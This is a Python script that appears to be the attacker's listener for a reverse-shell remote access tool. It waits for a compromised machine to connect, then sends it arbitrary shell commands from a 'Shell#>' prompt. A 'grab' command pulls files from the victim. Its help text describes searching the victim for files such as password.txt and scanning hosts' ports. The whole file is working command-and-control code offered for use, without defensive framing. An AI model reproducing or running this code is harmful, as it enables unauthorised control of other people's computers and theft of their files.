import socket
import os
import sys

def transfer(conn,command):
    conn.send(command.encode())
    grab,path=command.split(" ")
    f=open('/root/Desktop/'+path,'wb')
    while True:
        bits=conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+]Transfer has been completed')
            break
        if 'File not found'.encode() in bits:
            print("[-] Unable to find out the file")
            break
        f.write(bits)
def help():
    print("\nterminate ----> to close the socket\n")
    print("grab -----> to get a file Eg: grab file.txt\n")
    print("cd ----> to change directory\n")
    print("search ----> to search for a file with a specified path Eg: search C:\ password.txt\n")
    print("scan -----> to scan a host Eg: scan 192.168.0.143:21,22,24,80 etc.\n")
def connect(ip,port):
    s=socket.socket()
    s.bind((str(ip),int(port)))
    s.listen(1)
    conn,addr=s.accept()
    print('[+] we got the connection from',addr)
    
    while True:
        command=input('Shell#>')
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn,command)
        elif 'help' in command:
            help()
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
            
            
def main():
    print("usage ./server.py <local ip addr> <port>\n")
    try:
        connect(sys.argv[1],sys.argv[2])
    except KeyboardInterrupt:
        print("[-]closed")
main()
